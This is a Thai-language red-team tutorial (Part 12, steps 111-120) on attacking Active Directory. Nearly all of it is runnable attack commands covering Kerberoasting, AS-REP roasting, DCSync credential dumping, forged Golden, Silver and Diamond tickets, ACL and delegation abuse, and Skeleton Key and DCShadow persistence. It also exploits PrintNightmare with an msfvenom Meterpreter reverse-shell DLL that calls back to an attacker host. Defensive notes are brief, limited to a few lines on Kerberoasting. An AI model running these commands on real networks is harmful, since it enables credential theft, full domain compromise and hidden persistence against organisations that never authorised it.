# Part 12: Active Directory Attacks Deep Dive (Steps 111-120)

## บทนำ

Active Directory (AD) เป็นบริการ Directory Service ของ Microsoft ที่ใช้กันอย่างแพร่หลายในองค์กรทั่วโลก การโจมตี AD เป็นหนึ่งในทักษะที่สำคัญที่สุดของ Red Teamer และ Penetration Tester ระดับสูง ในบทนี้จะครอบคลุมทั้ง Enumeration, Exploitation และ Privilege Escalation ใน Active Directory

---

## Step 111: Active Directory Enumeration Deep Dive

### การ Enumerate AD อย่างละเอียด

```bash
# ==========================================
# เครื่องมือ Enumeration
# ==========================================

# ==========================================
# 1. ldapdomaindump
# ==========================================
sudo pip3 install ldapdomaindump

# Dump ทุกอย่างจาก AD
ldapdomaindump -u 'domain\user' -p password ldap://192.168.1.x

# Output files:
# domain_computers.json
# domain_groups.json
# domain_users.json
# domain_policy.json
# domain_trusts.json

# ==========================================
# 2. enum4linux-ng (ใหม่กว่า enum4linux)
# ==========================================
sudo apt install enum4linux-ng

enum4linux-ng -A 192.168.1.x
enum4linux-ng -U 192.168.1.x    # Users only
enum4linux-ng -G 192.168.1.x    # Groups only
enum4linux-ng -S 192.168.1.x    # Shares only

# ==========================================
# 3. rpcclient
# ==========================================

# Null session (anonymous)
rpcclient -U "" -N 192.168.1.x

# Authenticated
rpcclient -U "domain\user%password" 192.168.1.x

# Commands ใน rpcclient:
# enumdomusers      - list users
# enumdomgroups     - list groups
# enumdomains       - list domains
# querydominfo      - domain info
# getdompwinfo      - password policy
# lookupnames root  - lookup SID for user
# lookupsids S-1-5-21-xxx  - lookup username for SID
# queryuser 0x1f4   - query user by RID

# ==========================================
# 4. windapsearch (LDAP enumeration)
# ==========================================

git clone https://github.com/ropnop/windapsearch.git
cd windapsearch
pip3 install -r requirements.txt

# Enumerate users
python3 windapsearch.py -d domain.local -u user@domain.local -p password --da

# Domain Admins
python3 windapsearch.py -d domain.local -u user@domain.local -p password --da

# Computers
python3 windapsearch.py -d domain.local -u user@domain.local -p password --computers

# Groups
python3 windapsearch.py -d domain.local -u user@domain.local -p password --groups

# GPOs
python3 windapsearch.py -d domain.local -u user@domain.local -p password --gpos

# ==========================================
# 5. PowerView (PowerShell)
# ==========================================

# ดาวน์โหลด
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

# ส่งไปยัง Windows และรัน:
powershell -ep bypass
Import-Module .\PowerView.ps1

# Domain Info
Get-Domain
Get-DomainController
Get-DomainTrust
Get-ForestTrust

# Users
Get-DomainUser
Get-DomainUser -Identity john
Get-DomainUser -SPN              # Kerberoastable users
Get-DomainUser -PreAuthNotRequired  # AS-REP Roastable

# Computers
Get-DomainComputer
Get-DomainComputer -Unconstrained  # Unconstrained delegation

# Groups
Get-DomainGroup
Get-DomainGroupMember -Identity "Domain Admins"

# GPOs
Get-DomainGPO
Get-DomainGPOUserLocalGroupMapping  # Local admin via GPO

# ACLs (ค้นหา permission ที่น่าสนใจ)
Find-InterestingDomainAcl
Find-InterestingDomainAcl -ResolveGUIDs

# Shares
Find-DomainShare
Find-InterestingDomainShareFile
```

---

## Step 112: BloodHound Advanced

### BloodHound Deep Dive

```bash
# ==========================================
# BloodHound Setup
# ==========================================

# ติดตั้ง
sudo apt install bloodhound neo4j

# เริ่ม neo4j
sudo neo4j start
# เปิด http://localhost:7474
# Default creds: neo4j/neo4j
# เปลี่ยน password

# เริ่ม BloodHound
bloodhound &

# ==========================================
# การเก็บข้อมูล (Collection)
# ==========================================

# SharpHound (Windows)
# ดาวน์โหลด: https://github.com/BloodHoundAD/SharpHound

# Collection Methods:
SharpHound.exe -c All                    # ทุกอย่าง
SharpHound.exe -c DCOnly                 # Domain Controller only
SharpHound.exe -c Container,Group       # เฉพาะ
SharpHound.exe --stealth                 # Stealth mode
SharpHound.exe --ExcludeDomainControllers

# Python (ไม่ต้องเข้า Windows)
pip3 install bloodhound
bloodhound-python -d domain.local \
    -u user -p password \
    -c All \
    -ns 192.168.1.x \
    --zip

# ==========================================
# BloodHound Queries
# ==========================================

# Pre-built Queries:
# - Find all Domain Admins
# - Find Shortest Paths to Domain Admins
# - Find Principals with DCSync Rights
# - Find all Paths from Kerberoastable Users
# - Find Workstations where Domain Users can RDP

# Custom Cypher Queries:
# ค้นหา user ที่มี path สั้นที่สุดไปยัง DA:
MATCH p=shortestPath((u:User)-[*1..]->(g:Group))
WHERE g.name =~ "DOMAIN ADMINS.*"
RETURN p

# ค้นหา computer ที่ unrestricted delegation:
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name

# ค้นหา users ที่ Kerberoastable:
MATCH (u:User {hasspn:true})
RETURN u.name,u.serviceprincipalnames

# ค้นหา AS-REP Roastable users:
MATCH (u:User {dontreqpreauth:true})
RETURN u.name

# ค้นหา ACL paths ไปยัง DA:
MATCH p=(u:User)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword]->(v)
RETURN p

# ==========================================
# ตีความผล BloodHound
# ==========================================

# Edge Types ที่น่าสนใจ:
# MemberOf         - เป็นสมาชิกของ group
# AdminTo          - Local admin บน computer
# HasSession       - Active session
# CanRDP           - สามารถ RDP ได้
# ExecuteDCOM      - DCOM execution rights
# AllowedToDelegate - Constrained delegation
# GenericAll       - Full control
# GenericWrite     - Write permissions
# WriteOwner       - Can change owner
# WriteDacl        - Can change DACL
# ForceChangePassword - Can reset password
# Owns             - Owns the object
```

---

## Step 113: Kerberoasting Advanced

```bash
# ==========================================
# Kerberoasting - เจาะลึก
# ==========================================

# ==========================================
# ค้นหา Kerberoastable Accounts
# ==========================================

# GetUserSPNs (Impacket)
impacket-GetUserSPNs domain.local/user:password \
    -dc-ip 192.168.1.x \
    -request \
    -outputfile kerberoast_hashes.txt

# เฉพาะ user เดียว
impacket-GetUserSPNs domain.local/user:password \
    -dc-ip 192.168.1.x \
    -request-user sqlservice

# ด้วย PowerView
Get-DomainUser -SPN | Select samaccountname,serviceprincipalnames

# ด้วย Rubeus (Windows)
.\Rubeus.exe kerberoast
.\Rubeus.exe kerberoast /user:sqlservice /outfile:hashes.txt

# ==========================================
# Crack Kerberos TGS Hashes
# ==========================================

# hashcat
hashcat -a 0 -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# john
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs kerberoast_hashes.txt

# ==========================================
# Targeted Kerberoasting
# ==========================================

# ถ้าเรามี GenericWrite บน user
# เราสามารถ Set SPN แล้ว Kerberoast ได้

# Set SPN ด้วย PowerView
Set-DomainObject -Identity target_user -Set @{serviceprincipalnames='http/fake'}
# Kerberoast
impacket-GetUserSPNs domain.local/user:password -dc-ip 192.168.1.x -request

# ==========================================
# ป้องกัน Kerberoasting
# ==========================================

# ตรวจสอบ accounts ที่ Kerberoastable:
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName |
    Select-Object SamAccountName, ServicePrincipalName

# แนวทางป้องกัน:
# 1. ใช้ Password ยาวมาก (25+ chars) สำหรับ service accounts
# 2. ใช้ Group Managed Service Accounts (gMSA)
# 3. ใช้ AES encryption แทน RC4
```

---

## Step 114: AS-REP Roasting

```bash
# ==========================================
# AS-REP Roasting
# ==========================================

# Users ที่ไม่ต้องการ Pre-Authentication
# สามารถขอ AS-REP โดยไม่ต้อง authenticate

# ==========================================
# ค้นหา Vulnerable Users
# ==========================================

# ด้วย Impacket (ไม่ต้องมี credentials ก็ได้ถ้า anonymous)
impacket-GetNPUsers domain.local/ \
    -usersfile users.txt \
    -no-pass \
    -dc-ip 192.168.1.x

# ถ้ามี credentials
impacket-GetNPUsers domain.local/user:password \
    -request \
    -dc-ip 192.168.1.x

# ด้วย PowerView
Get-DomainUser -PreauthNotRequired | Select samaccountname

# ด้วย Rubeus
.\Rubeus.exe asreproast
.\Rubeus.exe asreproast /outfile:asrep_hashes.txt

# ==========================================
# Crack AS-REP Hashes
# ==========================================

# hashcat
hashcat -a 0 -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# john
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep asrep_hashes.txt

# ==========================================
# Targeted AS-REP Roasting
# ==========================================

# ถ้าเรามี GenericWrite บน user
# สามารถ disable Pre-Auth แล้ว AS-REP Roast ได้

# ด้วย PowerView
Set-DomainObject -Identity target_user -XOR @{useraccountcontrol=4194304}
# 4194304 = DONT_REQUIRE_PREAUTH

# ขอ AS-REP hash
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.x

# Restore
Set-DomainObject -Identity target_user -XOR @{useraccountcontrol=4194304}
```

---

## Step 115: DCSync Attack

```bash
# ==========================================
# DCSync Attack
# ==========================================

# DCSync ใช้ Directory Replication Service (DRS)
# ต้องการ privileges:
# - DS-Replication-Get-Changes
# - DS-Replication-Get-Changes-All
# Default: Domain Admins, Enterprise Admins, Domain Controllers

# ==========================================
# ด้วย Mimikatz
# ==========================================

# ดึง hash ของ user เฉพาะ
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:Administrator"
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt"

# ดึงทุก user
mimikatz.exe "lsadump::dcsync /domain:domain.local /all /csv"

# รัน as SYSTEM
mimikatz.exe "token::elevate" "lsadump::dcsync /domain:domain.local /user:krbtgt"

# ==========================================
# ด้วย Impacket
# ==========================================

# secretsdump - DCSync remotely
impacket-secretsdump domain.local/admin:password@192.168.1.x
impacket-secretsdump domain.local/admin:password@dc01.domain.local -just-dc

# ดึงเฉพาะ user ที่ต้องการ
impacket-secretsdump domain.local/admin:password@192.168.1.x \
    -just-dc-user Administrator

# ใช้ hash (PtH)
impacket-secretsdump -hashes :ntlm_hash domain.local/admin@192.168.1.x

# ==========================================
# ด้วย CrackMapExec
# ==========================================

crackmapexec smb 192.168.1.x -u admin -p password --ntds
crackmapexec smb 192.168.1.x -u admin -p password --ntds --users

# ==========================================
# ตรวจสอบสิทธิ์ DCSync
# ==========================================

# ด้วย PowerView
Get-ObjectAcl -DistinguishedName "dc=domain,dc=local" -ResolveGUIDs |
    Where-Object {$_.ObjectType -eq "DS-Replication-Get-Changes-All"}

# เพิ่มสิทธิ์ DCSync ให้ user (ถ้ามี WriteDacl)
Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' \
    -PrincipalIdentity compromised_user \
    -Rights DCSync
```

---

## Step 116: Golden & Silver Tickets

```bash
# ==========================================
# Golden Ticket Attack
# ==========================================

# Golden Ticket = สร้าง TGT ปลอม
# ต้องการ:
# - krbtgt NTLM hash
# - Domain SID

# ==========================================
# หา Domain SID
# ==========================================

# ด้วย whoami
whoami /user
# S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-XXXX
# ตัดเลข RID ท้ายออก = Domain SID

# ด้วย PowerShell
(Get-ADDomain).DomainSID.Value

# ด้วย Impacket
impacket-secretsdump domain.local/admin:password@192.168.1.x | grep krbtgt

# ==========================================
# สร้าง Golden Ticket ด้วย Mimikatz
# ==========================================

# ใน Mimikatz:
kerberos::golden /user:Administrator \
    /domain:domain.local \
    /sid:S-1-5-21-xxx-xxx-xxx \
    /krbtgt:krbtgt_ntlm_hash \
    /ptt

# /ptt = Pass the Ticket (inject ทันที)
# หรือ /ticket:golden.kirbi (บันทึกไฟล์)

# ตรวจสอบ ticket
klist

# ใช้ ticket
dir \\dc01\c$
psexec \\dc01 cmd.exe

# ==========================================
# สร้าง Golden Ticket ด้วย Impacket
# ==========================================

impacket-ticketer -nthash krbtgt_hash \
    -domain-sid S-1-5-21-xxx-xxx-xxx \
    -domain domain.local \
    Administrator

# ใช้ ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@dc01.domain.local

# ==========================================
# Silver Ticket Attack
# ==========================================

# Silver Ticket = สร้าง TGS ปลอม
# ต้องการ:
# - Service account NTLM hash
# - SPN ของ service

# ตัวอย่าง: สร้าง Silver Ticket สำหรับ CIFS
kerberos::golden /user:Administrator \
    /domain:domain.local \
    /sid:S-1-5-21-xxx-xxx-xxx \
    /target:dc01.domain.local \
    /service:cifs \
    /rc4:service_ntlm_hash \
    /ptt

# ใช้งาน
dir \\dc01\c$

# Silver Ticket สำหรับ WinRM (HTTP)
kerberos::golden /user:Administrator \
    /domain:domain.local \
    /sid:S-1-5-21-xxx-xxx-xxx \
    /target:dc01.domain.local \
    /service:http \
    /rc4:service_ntlm_hash \
    /ptt

# Silver Ticket สำหรับ MSSQL
kerberos::golden /user:Administrator \
    /domain:domain.local \
    /sid:S-1-5-21-xxx-xxx-xxx \
    /target:sql01.domain.local \
    /service:MSSQLSvc \
    /rc4:sql_service_hash \
    /ptt
```

---

## Step 117: ACL Abuse

```bash
# ==========================================
# ACL (Access Control List) Abuse
# ==========================================

# ==========================================
# ค้นหา ACL ที่น่าสนใจ
# ==========================================

# ด้วย BloodHound
# Query: Find all users with DCSync rights
# Query: Shortest paths using ACLs

# ด้วย PowerView
# ค้นหา ACL ที่เราควบคุม
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.IdentityReferenceName -eq "compromised_user"
}

# ==========================================
# GenericAll บน User
# ==========================================

# ถ้าเรามี GenericAll บน user -> เปลี่ยน password
$password = ConvertTo-SecureString "NewPass123!" -AsPlainText -Force
Set-DomainUserPassword -Identity target_user -AccountPassword $password

# หรือ Force-change password
.\PowerView.ps1
Set-DomainUserPassword target_user -AccountPassword (ConvertTo-SecureString "pass123!" -AsPlainText -Force)

# ==========================================
# GenericAll บน Group
# ==========================================

# เพิ่มตัวเองเข้า group
Add-DomainGroupMember -Identity "Domain Admins" -Members compromised_user
# ตรวจสอบ
Get-DomainGroupMember -Identity "Domain Admins"

# ==========================================
# WriteDACL
# ==========================================

# ถ้าเรามี WriteDACL บน Domain Object
# -> เพิ่มสิทธิ์ DCSync ให้ตัวเอง

Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' \
    -PrincipalIdentity compromised_user \
    -Rights DCSync

# ==========================================
# WriteOwner
# ==========================================

# ถ้าเรามี WriteOwner
# -> เปลี่ยน owner แล้วได้ GenericAll

Set-DomainObjectOwner -Identity target_user -OwnerIdentity compromised_user
# ตอนนี้เรา own target_user
Add-DomainObjectAcl -TargetIdentity target_user -PrincipalIdentity compromised_user -Rights All

# ==========================================
# ForceChangePassword
# ==========================================

# Reset password โดยไม่ต้องรู้ password เดิม
$SecPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity target_user -AccountPassword $SecPassword

# ==========================================
# GenericWrite บน Computer (RBCD)
# ==========================================

# Resource-Based Constrained Delegation
# ถ้ามี GenericWrite บน Computer
# -> ตั้งค่า msds-AllowedToActOnBehalfOfOtherIdentity

# สร้าง computer account ใหม่
addcomputer.py -computer-name 'ATTACKER$' -computer-pass 'AttackerPass1' \
    domain.local/user:password -dc-ip 192.168.1.x

# Set RBCD attribute
rbcd.py -action write \
    -delegate-from 'ATTACKER$' \
    -delegate-to 'TARGET$' \
    domain.local/user:password -dc-ip 192.168.1.x

# ขอ ticket
getST.py -spn cifs/target.domain.local \
    -impersonate Administrator \
    domain.local/'ATTACKER$':AttackerPass1 -dc-ip 192.168.1.x

# ใช้ ticket
export KRB5CCNAME=Administrator@cifs_target.domain.local.ccache
psexec.py -k -no-pass target.domain.local
```

---

## Step 118: Delegation Attacks

```bash
# ==========================================
# Kerberos Delegation Attacks
# ==========================================

# ==========================================
# Unconstrained Delegation
# ==========================================

# ค้นหา computers ที่มี Unconstrained Delegation
Get-DomainComputer -Unconstrained | Select name

# BloodHound query:
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name

# Attack:
# เมื่อ user authenticate ไปยัง computer ที่มี Unconstrained Delegation
# TGT ของ user จะถูกเก็บไว้ใน memory

# ใน Meterpreter บน Unconstrained Delegation machine:
# Monitor และ extract TGT
.\Rubeus.exe monitor /interval:5

# Trigger authentication โดย PrintSpooler bug (PrinterBug)
# ด้วย SpoolSample:
.\SpoolSample.exe dc01.domain.local attacker_machine.domain.local

# หรือ PetitPotam:
python3 PetitPotam.py -u user -p password ATTACKER_IP dc01.domain.local

# ดัก TGT ที่ถูกส่งมา
.\Rubeus.exe monitor /interval:1 /filteruser:DC01$

# ==========================================
# Constrained Delegation
# ==========================================

# ค้นหา Constrained Delegation
Get-DomainUser -TrustedToAuth | Select samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select name,msds-allowedtodelegateto

# Attack (ถ้ามี password/hash ของ delegation account):
impacket-getST -spn cifs/dc01.domain.local \
    -impersonate Administrator \
    domain.local/service_account:password \
    -dc-ip 192.168.1.x

# ใช้ ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@dc01.domain.local

# ==========================================
# Resource-Based Constrained Delegation (RBCD)
# ==========================================

# (ดู Step 117 ด้านบน)

# ขั้นตอนสรุป:
# 1. สร้าง/ใช้ computer account ที่เราควบคุม
# 2. เขียน SID ของ computer นั้นลงใน msds-AllowedToActOnBehalfOfOtherIdentity ของ target
# 3. ขอ S4U2self + S4U2proxy ticket
# 4. ใช้ ticket เข้าถึง target ในฐานะ Domain Admin

# ด้วย Impacket rbcd.py
# เขียน RBCD attribute
rbcd.py -action write \
    -delegate-from 'CONTROLLED_COMPUTER$' \
    -delegate-to 'TARGET_COMPUTER$' \
    -dc-ip 192.168.1.x \
    domain.local/user:password

# ขอ Service Ticket
getST.py \
    -spn 'cifs/target.domain.local' \
    -impersonate 'Administrator' \
    -dc-ip 192.168.1.x \
    'domain.local/CONTROLLED_COMPUTER$:password'

# ==========================================
# PrintNightmare (CVE-2021-1675/34527)
# ==========================================

# ช่องโหว่ใน Windows Print Spooler
# ทำให้สามารถ RCE ด้วยสิทธิ์ SYSTEM

git clone https://github.com/cube0x0/CVE-2021-1675.git
cd CVE-2021-1675

# สร้าง DLL payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f dll -o evil.dll

# Host DLL ผ่าน SMB
impacket-smbserver share ./

# Exploit
python3 CVE-2021-1675.py domain.local/user:password@192.168.1.x '\\192.168.1.100\share\evil.dll'
```

---

## Step 119: Domain Persistence

```bash
# ==========================================
# Domain Persistence Techniques
# ==========================================

# ==========================================
# 1. Golden Ticket (ดู Step 116)
# ==========================================

# ==========================================
# 2. Diamond Ticket
# ==========================================

# สร้าง TGT โดย modify PAC ของ TGT จริง
# ตรวจจับยากกว่า Golden Ticket

.\Rubeus.exe diamond /krbkey:krbtgt_aes256_hash \
    /user:Administrator \
    /enctype:aes \
    /ticketuser:lowprivuser \
    /dc:dc01.domain.local \
    /printcmd

# ==========================================
# 3. Skeleton Key
# ==========================================

# Patch LSASS บน DC เพื่อให้ password "mimikatz" ใช้ได้กับทุก account

mimikatz.exe "privilege::debug" "misc::skeleton"

# ตอนนี้ใช้ password "mimikatz" ได้กับทุก account:
net use \\dc01\admin$ /user:Administrator mimikatz

# ==========================================
# 4. DSRM Account
# ==========================================

# Directory Services Restore Mode
# Account นี้มีอยู่บน DC ทุกเครื่อง

# ดู DSRM hash ด้วย Mimikatz
lsadump::sam

# เปลี่ยน registry ให้ใช้ DSRM account ผ่าน network
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2

# ใช้ DSRM hash เข้า DC
impacket-secretsdump -sam -hashes :dsrm_hash 'Administrator@dc01.domain.local'

# ==========================================
# 5. Custom SSP (Security Support Provider)
# ==========================================

# Inject custom SSP เพื่อดัก credentials
mimikatz.exe "misc::memssp"

# Credentials จะถูก log ที่ C:\Windows\System32\kiwissp.log

# ==========================================
# 6. AdminSDHolder
# ==========================================

# AdminSDHolder เป็น template สำหรับ protected accounts
# ถ้าเราแก้ ACL บน AdminSDHolder -> จะ propagate ไปยัง protected groups

# เพิ่มตัวเองเข้า AdminSDHolder ACL
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' \
    -PrincipalIdentity compromised_user \
    -Rights All

# รอ SDProp process (ทุก 60 นาที) หรือ force:
Invoke-ADSDPropagation  # tool เสริม

# ==========================================
# 7. DCShadow
# ==========================================

# สร้าง Rogue DC เพื่อ push changes เข้า AD
# ต้องการ Domain Admin

# เปิด 2 processes:
# Process 1 (privileged):
mimikatz.exe "!processtoken" "lsadump::dcshadow /object:user /attribute:badpwdcount /value:0"

# Process 2 (Domain Admin):
mimikatz.exe "lsadump::dcshadow /push"
```

---

## Step 120: Cross-Forest Attacks

```bash
# ==========================================
# Cross-Forest Attacks
# ==========================================

# ==========================================
# Forest Trust Enumeration
# ==========================================

# ด้วย PowerView
Get-DomainTrust
Get-ForestTrust
Get-DomainTrustMapping

# ด้วย ADSISearcher
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# ด้วย Impacket
impacket-getTGT domain.local/user:password
export KRB5CCNAME=user.ccache
impacket-GetADUsers -k -no-pass -all -dc-ip 192.168.1.x trusted.local/

# ==========================================
# Trust Ticket Attack
# ==========================================

# ถ้ามี trust เป็น Bidirectional
# สามารถสร้าง inter-realm TGT

# หา Trust Account Hash
lsadump::trust /patch
# หรือ
lsadump::dcsync /domain:domain.local /user:TRUSTED$

# สร้าง Trust Ticket
kerberos::golden /user:Administrator \
    /domain:domain.local \
    /sid:S-1-5-21-source-domain-sid \
    /sids:S-1-5-21-target-domain-sid-519 \
    /rc4:trust_key_hash \
    /service:krbtgt \
    /target:trusted.local \
    /ticket:trust_ticket.kirbi

# ขอ TGS ใน trusted forest
.\asktgs.exe trust_ticket.kirbi CIFS/dc.trusted.local

# ==========================================
# SID History Injection
# ==========================================

# Inject SID ของ Enterprise Admins จาก target forest ใน SID History
kerberos::golden /user:Administrator \
    /domain:domain.local \
    /sid:S-1-5-21-source-domain-sid \
    /sids:S-1-5-21-target-forest-519 \
    /krbtgt:krbtgt_hash \
    /ptt

# ==========================================
# Foreign Group Membership
# ==========================================

# ค้นหา users จาก foreign domain ที่เป็น member ใน local group
Get-DomainForeignGroupMember
Get-DomainForeignUser

# ==========================================
# Child to Parent Domain Attack
# ==========================================

# ถ้าเรา compromise child domain
# สามารถ escalate ไปยัง parent domain

# หา krbtgt hash ของ child domain
lsadump::dcsync /user:child.domain.local\krbtgt

# หา SID ของ parent Enterprise Admins
Get-ADGroup "Enterprise Admins" -Server parent.domain.local | Select SID

# สร้าง Golden Ticket ด้วย ExtraSids
kerberos::golden /user:Administrator \
    /domain:child.domain.local \
    /sid:S-1-5-21-child-domain-sid \
    /sids:S-1-5-21-parent-domain-sid-519 \
    /krbtgt:child_krbtgt_hash \
    /ptt

# เข้าถึง parent domain
dir \\parentdc.parent.domain.local\c$

# ==========================================
# Automation Script
# ==========================================

#!/usr/bin/env python3
# ad_enum.py - Quick AD Enumeration

import subprocess
import sys

DC_IP = "192.168.1.x"
DOMAIN = "domain.local"
USER = "user"
PASS = "password"

def run_cmd(cmd):
    result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
    return result.stdout

print("[*] Enumerating Domain Users...")
print(run_cmd(f"impacket-GetADUsers -all {DOMAIN}/{USER}:{PASS} -dc-ip {DC_IP}"))

print("[*] Checking for Kerberoastable Users...")
print(run_cmd(f"impacket-GetUserSPNs {DOMAIN}/{USER}:{PASS} -dc-ip {DC_IP}"))

print("[*] Checking for AS-REP Roastable Users...")
print(run_cmd(f"impacket-GetNPUsers {DOMAIN}/{USER}:{PASS} -request -dc-ip {DC_IP}"))

print("[*] Dumping Domain Policy...")
print(run_cmd(f"ldapsearch -x -H ldap://{DC_IP} -D '{USER}@{DOMAIN}' -w {PASS} -b 'DC=domain,DC=local' '(objectClass=domain)' lockoutThreshold lockoutDuration"))
```

---

## สรุป Part 12

ในบทนี้คุณได้เรียนรู้:

✅ **Step 111**: Active Directory Enumeration Deep Dive  
✅ **Step 112**: BloodHound Advanced Queries  
✅ **Step 113**: Kerberoasting Advanced Techniques  
✅ **Step 114**: AS-REP Roasting  
✅ **Step 115**: DCSync Attack  
✅ **Step 116**: Golden & Silver Tickets  
✅ **Step 117**: ACL Abuse  
✅ **Step 118**: Delegation Attacks (Unconstrained/Constrained/RBCD)  
✅ **Step 119**: Domain Persistence  
✅ **Step 120**: Cross-Forest Attacks  

## เครื่องมือที่ใช้

| เครื่องมือ | ใช้สำหรับ |
|-----------|----------|
| BloodHound | AD Attack Path Visualization |
| Mimikatz | Credential Dumping, Ticket Creation |
| Rubeus | Kerberos Operations |
| PowerView | AD Enumeration |
| Impacket | Remote AD Operations |
| CrackMapExec | AD Attack Automation |
| ldapdomaindump | LDAP Enumeration |

## แบบฝึกหัด

1. ติดตั้ง Vulnerable AD Lab (https://github.com/WalterForte/Vulnerable-AD)
2. ทำ BloodHound และค้นหา Attack Path
3. ทำ Kerberoasting และ crack hashes
4. ทำ DCSync และ dump credentials
5. สร้าง Golden Ticket และ persist

## ถัดไป: Part 13 - Cloud Security (AWS/Azure)

---

*Part 12 | Steps 111-120 | ระดับ: สูง-มืออาชีพ*
